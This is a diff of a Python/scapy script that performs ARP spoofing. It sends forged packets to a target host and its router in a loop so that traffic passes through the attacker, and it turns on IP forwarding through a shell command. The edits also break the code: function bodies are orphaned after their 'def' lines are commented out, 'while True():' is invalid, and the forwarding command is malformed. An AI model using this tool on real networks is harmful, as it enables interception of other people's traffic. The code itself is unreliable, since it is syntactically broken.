@@ -5,7 +5,7 @@ import argparse
 import subprocess
 # import re
 import time
-import atexit
+# import atexit
 
 #    def router_ip_finder():
 #        dirty_Output = subprocess.check_output("route", shell=True)
@@ -57,12 +57,12 @@ def spoof(dest_IP, spoofed_IP):
     return packet
 
 
-def start_flow(i):
+# def start_flow(i):
     print("[+] Stated port forwarding")
     subprocess.run("echo '1' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
-def stop_flow(i):
+# def stop_flow(i):
     print("[+] ending port forwarding")
     subprocess.run("echo '0' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
@@ -71,20 +71,20 @@ def main():
     options = get_arguments()
     target_IP = options.target
     router_IP = options.router
-    interface = options.interface
+#    interface = options.interface
 
     packet_for_target = spoof(target_IP, router_IP)
     packet_for_router = spoof(router_IP, target_IP)
 
-    start_flow(interface)
+#    start_flow(interface)
 
     print("[+] Spoofing has begin")
-    while ():
+    while True():
         scapy.send(packet_for_target)
         scapy.send(packet_for_router)
         time.sleep(3)
 
-    atexit.register(stop_flow(interface))
+#    atexit.register(stop_flow(interface))
 
 
 main()
